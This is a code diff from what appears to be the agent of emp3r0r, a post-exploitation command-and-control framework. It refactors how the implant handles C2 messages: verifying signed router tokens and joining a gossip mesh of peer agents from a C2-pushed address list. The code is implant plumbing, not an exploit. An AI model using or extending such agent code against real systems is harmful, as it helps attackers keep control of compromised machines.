@@ -5,7 +5,6 @@ import (
 	"strings"
 	"time"
 
-	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
@@ -23,55 +22,12 @@ func HandleC2Command(cmdData *def.MsgTunData) {
 		}
 	}()
 
-	// Handle AgentToken push from C2
-	if cmdData.Tag == def.TagAgentToken {
-		var tok def.AgentToken
-		if err := cbor.Unmarshal(cmdData.Response, &tok); err != nil {
-			logging.Errorf("HandleC2Command: AgentToken unmarshal: %v", err)
-			return
+	// Post-handshake session state: router token and/or peer list.
+	if cmdData.Tag == def.TagSessionInfo {
+		if cmdData.AgentToken != nil {
+			handleAgentToken(cmdData.AgentToken)
 		}
-		// Verify signature
-		payload := fmt.Sprintf("%s%s%s%d", tok.AgentID, tok.IP, tok.Capability, tok.ExpiresAt)
-		valid, err := transport.VerifySignatureWithCA([]byte(payload), tok.Signature)
-		if err != nil || !valid {
-			logging.Errorf("HandleC2Command: AgentToken signature invalid: %v", err)
-			return
-		}
-		common.RuntimeConfig.MyAgentToken = &tok
-		logging.Successf("AgentToken received (cap=%s, expires=%v)", tok.Capability, time.Unix(tok.ExpiresAt, 0))
-		// Re-broadcast gossip NodeMeta immediately so peers in the mesh cluster
-		// see our updated token without waiting for the next push-pull cycle.
-		mesh.UpdateGossipMeta()
-		return
-	}
-
-	// Process the peer list pushed by C2 for mesh discovery. The list is
-	// authenticated by the PFS tunnel, so no additional signature check is
-	// needed here.
-	if cmdData.Tag == def.TagPeerList {
-		if cmdData.EnrichedPeerList == nil || len(cmdData.EnrichedPeerList.Peers) == 0 {
-			return
-		}
-		logging.Infof("Received peer list (%d peers)", len(cmdData.EnrichedPeerList.Peers))
-		peerAddrs := make([]string, 0)
-		for _, ep := range cmdData.EnrichedPeerList.Peers {
-			port := ep.MeshGossipPort
-			if port == "" {
-				port = "7946"
-			}
-			fromIP := strings.Split(ep.From, ":")[0]
-			if fromIP != "" && fromIP != "127.0.0.1" {
-				peerAddrs = append(peerAddrs, fmt.Sprintf("%s:%s", fromIP, port))
-			}
-			for _, ip := range ep.IPs {
-				if ip != "" && ip != "127.0.0.1" && !strings.HasPrefix(ip, "127.") {
-					peerAddrs = append(peerAddrs, fmt.Sprintf("%s:%s", ip, port))
-				}
-			}
-		}
-		if len(peerAddrs) > 0 {
-			mesh.Join(peerAddrs)
-		}
+		handlePeerList(cmdData.EnrichedPeerList)
 		return
 	}
 
@@ -100,5 +56,48 @@ func HandleC2Command(cmdData *def.MsgTunData) {
 	err := command.Execute()
 	if err != nil {
 		c2transport.NotifyC2(command, "Error: %v", err)
+	}
+}
+
+// handleAgentToken verifies and installs a C2-issued mesh router token.
+func handleAgentToken(tok *def.AgentToken) {
+	payload := fmt.Sprintf("%s%s%s%d", tok.AgentID, tok.IP, tok.Capability, tok.ExpiresAt)
+	valid, err := transport.VerifySignatureWithCA([]byte(payload), tok.Signature)
+	if err != nil || !valid {
+		logging.Errorf("HandleC2Command: AgentToken signature invalid: %v", err)
+		return
+	}
+	common.RuntimeConfig.MyAgentToken = tok
+	logging.Successf("AgentToken received (cap=%s, expires=%v)", tok.Capability, time.Unix(tok.ExpiresAt, 0))
+	// Re-broadcast gossip NodeMeta immediately so peers in the mesh cluster
+	// see our updated token without waiting for the next push-pull cycle.
+	mesh.UpdateGossipMeta()
+}
+
+// handlePeerList joins the mesh gossip addresses advertised by C2. The list is
+// authenticated by the PFS tunnel, so no additional signature check is needed.
+func handlePeerList(list *def.EnrichedPeerList) {
+	if list == nil || len(list.Peers) == 0 {
+		return
+	}
+	logging.Infof("Received peer list (%d peers)", len(list.Peers))
+	peerAddrs := make([]string, 0)
+	for _, ep := range list.Peers {
+		port := ep.MeshGossipPort
+		if port == "" {
+			port = "7946"
+		}
+		fromIP := strings.Split(ep.From, ":")[0]
+		if fromIP != "" && fromIP != "127.0.0.1" {
+			peerAddrs = append(peerAddrs, fmt.Sprintf("%s:%s", fromIP, port))
+		}
+		for _, ip := range ep.IPs {
+			if ip != "" && ip != "127.0.0.1" && !strings.HasPrefix(ip, "127.") {
+				peerAddrs = append(peerAddrs, fmt.Sprintf("%s:%s", ip, port))
+			}
+		}
+	}
+	if len(peerAddrs) > 0 {
+		mesh.Join(peerAddrs)
 	}
 }
